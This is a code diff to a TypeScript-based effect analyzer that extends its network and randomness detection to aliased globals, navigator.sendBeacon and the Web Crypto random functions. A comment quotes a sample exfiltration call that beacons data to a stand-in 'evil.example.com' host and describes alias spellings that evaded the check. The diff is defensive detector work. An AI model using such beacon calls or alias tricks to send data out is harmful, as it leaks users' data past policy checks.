@@ -2156,6 +2156,33 @@ const corruptDepPkgs = new Set();
 if (allowJs) { compilerOptions.allowJs = true; compilerOptions.checkJs = false; }
 const program = ts.createProgram(fileNames, compilerOptions);
 const checker = program.getTypeChecker();
+
+/** A LOCAL ALIAS OF A GLOBAL IS STILL THAT GLOBAL — unwrap the binding to the node it was bound FROM.
+ *
+ * The global classifiers key on the callee/ctor NODE TEXT (`callee.text === "fetch"`,
+ * `ctorName === "WebSocket"`), so `const send = fetch; send(url)` and `const W = WebSocket; new W(url)`
+ * matched nothing and read PURE. Measured on published 0.29.0: `deny Net` answered exit 0 over a POST of
+ * caller data to an external host.
+ *
+ * DEFINED ONCE, ON PURPOSE. This defect has now appeared in three spellings — the bare identifier, the
+ * `globalThis.` qualifier, and the alias — each fixed where it was found. A second private copy of this
+ * unwrap is how the fourth spelling gets missed, so the call path and the `new` path share this.
+ *
+ * Returns the INITIALIZER NODE, never a name, so every caller's existing shadow guard still decides: a
+ * project-local `fetch` reached through an alias resolves to a project-local declaration and fabricates
+ * nothing. Bounded to 4 hops and only through identifier/property-access initializers — a rebinding,
+ * never a computed value, so this never follows a call or a conditional into a wrong answer.
+ */
+const unaliasGlobal = (expr) => {
+  for (let hop = 0; hop < 4 && ts.isIdentifier(expr); hop++) {
+    const decl = (checker.getSymbolAtLocation(expr)?.declarations ?? [])[0];
+    if (!decl || !ts.isVariableDeclaration(decl) || !decl.initializer) return expr;
+    const init = decl.initializer;
+    if (!ts.isIdentifier(init) && !ts.isPropertyAccessExpression(init)) return expr;
+    expr = init;
+  }
+  return expr;
+};
 const projectFiles = new Set(fileNames.map((f) => path.resolve(f)));
 const sources = program.getSourceFiles().filter((f) => projectFiles.has(path.resolve(f.fileName)));
 
@@ -4622,12 +4649,37 @@ function visitCalls(node) {
               else rec.incomplete.add("Net");
             }
           }
+          // `navigator.sendBeacon(url, data)` — Net, and the one this set most needed. It exists to POST
+          // data to a server on page-unload, it is what analytics and telemetry reach for, and it read
+          // PURE: `deny Net` answered exit 0 over
+          //     navigator.sendBeacon("https://evil.example.com/collect", data)
+          // on published 0.29.0. Found by sweeping the ALIAS spelling across every effect-global — the
+          // alias was the question, and the DIRECT call turned out to be missing too.
+          // The URL is argument 0. No literal ⇒ `incomplete: Net`, the same fail-closed posture the
+          // `open`/ctor branches take, so a runtime endpoint cannot be certified by an allowlist.
+          if (parent === "Navigator" && name === "sendBeacon") {
+            rec.direct.add("Net");
+            const u = (node.arguments ?? [])[0];
+            const lit = u && ts.isStringLiteralLike(u)
+              ? u.text : (u ? (resolveConstUrlString(u) ?? literalHeadHostUrl(u)) : null);
+            const h = lit ? hostLiteral(lit) : null;
+            if (h) { rec.hosts.add(h); for (const e of modelHostEffects(h)) rec.direct.add(e); }
+            else rec.incomplete.add("Net");
+          }
+          // `crypto.getRandomValues(buf)` — the Web Crypto RNG is Rand, and `Rand` is in the vocabulary.
+          // Node's `randomBytes` was already charged because it arrives through an IMPORT; the browser
+          // global resolves to lib.dom and was charged nothing, so `deny Rand` passed over it.
+          if (parent === "Crypto" && (name === "getRandomValues" || name === "randomUUID")) {
+            rec.direct.add("Rand");
+          }
           // `new EventSource(url)` / `new WebSocket(url)`: the constructor is declared on an anonymous
           // `declare var` object type (symbol `__type`, no usable parent name), but reaching the es-lib
           // branch already proves the ctor resolved to lib.dom (not a project class shadowing the name),
           // so the constructed identifier is the real browser global.
           if (ts.isNewExpression(node)) {
-            const ctorName = node.expression.getText();
+            // …through an alias too: `const W = WebSocket; new W(url)` reads a ctor named "W".
+            // Same defect as the call path, one node type over — hence the SHARED unwrap.
+            const ctorName = unaliasGlobal(node.expression).getText();
             if (ctorName === "EventSource" || ctorName === "WebSocket") {
               rec.direct.add("Net");
               // The URL is argument 0 of both constructors — see the XHR note above for the measurement.
@@ -5006,16 +5058,6 @@ function visitCalls(node) {
     // declaration still fails the "not declared in this project" test and fabricates nothing. Bounded to
     // 4 hops, and only through a plain identifier/property-access initializer — a rebinding, never a
     // computed value, so nothing here follows a function call or a conditional into a wrong answer.
-    const unaliasGlobal = (expr) => {
-      for (let hop = 0; hop < 4 && ts.isIdentifier(expr); hop++) {
-        const decl = (checker.getSymbolAtLocation(expr)?.declarations ?? [])[0];
-        if (!decl || !ts.isVariableDeclaration(decl) || !decl.initializer) return expr;
-        const init = decl.initializer;
-        if (!ts.isIdentifier(init) && !ts.isPropertyAccessExpression(init)) return expr;
-        expr = init;
-      }
-      return expr;
-    };
     const callee = unaliasGlobal(node.expression);
     const ctext = callee.getText().replace(/\s+/g, "");
     let geff = null;
